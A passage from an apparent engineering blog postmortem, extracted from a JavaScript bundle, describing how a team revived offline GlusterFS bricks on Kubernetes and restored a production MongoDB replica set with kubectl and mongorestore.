`heketi` and `glusterfs`. We noticed that neither the `glusterfs` or the `heketi` `Pod`s had any logs from standard output and all of them, according to `kubectl get pods -n storage`, were in healthy, `Running` state.\\n\\nWe decided it would be best to use the `gluster` CLI and try to troubleshoot why the provisioning is failing. Luckily, the issue was pretty easy to find. We accessed the `glusterfs` Pod and ran the following command to check the status of `heketidbstorage`:\\n\\n```bash\\n> kubectl exec glusterfs-k96d2 -it -- bash\\n> [ec2-user@node1 /] gluster volume status heketidbstorage\\nStatus of volume: heketidbstorage\\nGluster process TCP Port RDMA Port Online Pid\\n------------------------------------------------------------------------------\\nBrick node1:/var/lib/heketi/mounts/vg\\n_4a5d18544111232fc76cdc9872d340d6/brick_75c\\nec7af846fbf2e770b9312c6bc56fe/brick 49152 0 N 198\\nBrick node2:/var/lib/heketi/mounts/vg\\n_3cf3e12449047bba9b1260d301914187/brick_3ea\\n27507e65df9ec9a4c0841d27962f9/brick 49153 0 N 198\\nBrick node3:/var/lib/heketi/mounts/vg\\n_78c5285b77bde0e7ed344df72ef5c630/brick_d54\\n3d1ea6e83036e7796a89b1594f4cc/brick 49152 0 N 186\\nSelf-heal Daemon on localhost N/A N/A Y 177\\nSelf-heal Daemon on node1 N/A N/A Y 183\\nSelf-heal Daemon on node1 N/A N/A Y 189\\n```\\n\\nWe noticed that none of the bricks on `node{1,2,3}` were online so we decided to restart it:\\n\\n```bash\\ngluster volume stop heketidbstorage \\ngluster volume start heketidbstorage\\n```\\n\\nThis resulted in all bricks on all nodes getting back online, released the GlusterFS `PVC` provisioning and allowed all MongoDB replicaset member `Pod`s to initialize successfully!\\n\\n## Restoring MongoDB and the Application\\n\\nAt this point, 3 intense and excruciating hours have passed, we had gone through a set a complex problems and we were all hoping that the last phase would result in a recovery of the MongoDB and the application.\\nWe had the GlusterFS `PVC` provisioned, we had all 3 MongoDB replica set `Pod`s up. All that was left was to:\\n\\n1. Copy the `mongodump` from the host machine to the master MongoDB replica set:\\n\\n    ```bash\\n    # Find out who is the master\\n\\n    > kubectl exec mongodb-replicaset-0 -c mongodb-replicaset -- mongo --eval=\'db.isMaster().primary\' --quiet\\n    mongodb-replicaset-0.mongodb-replicaset.svc.cluster.local:27017\\n\\n    # Copy the mongodump into the master Pod\\n\\n    > kubectl cp /tmp/mongodb0/mongodump mongodb-replicaset-0 -c mongodb-replicaset:/tmp/\\n    ```\\n\\n1. Run `mongorestore`:\\n\\n    ```bash\\n    # Restore the database\\n\\n    > kubectl exec mongodb-replicaset-0 -c mongodb-replicaset -- mongorestore -d prod --drop /tmp/mongodump/prod\\n    ```\\n\\n1. Clear cache by deleting all `Pod`s in the application namespace:\\n\\n    ```bash\\n    > kubectl delete pod --all -n prod\\n    ```\\n\\nVoila! All Pods started successfully and the application was loading again!"}]}}')}}]);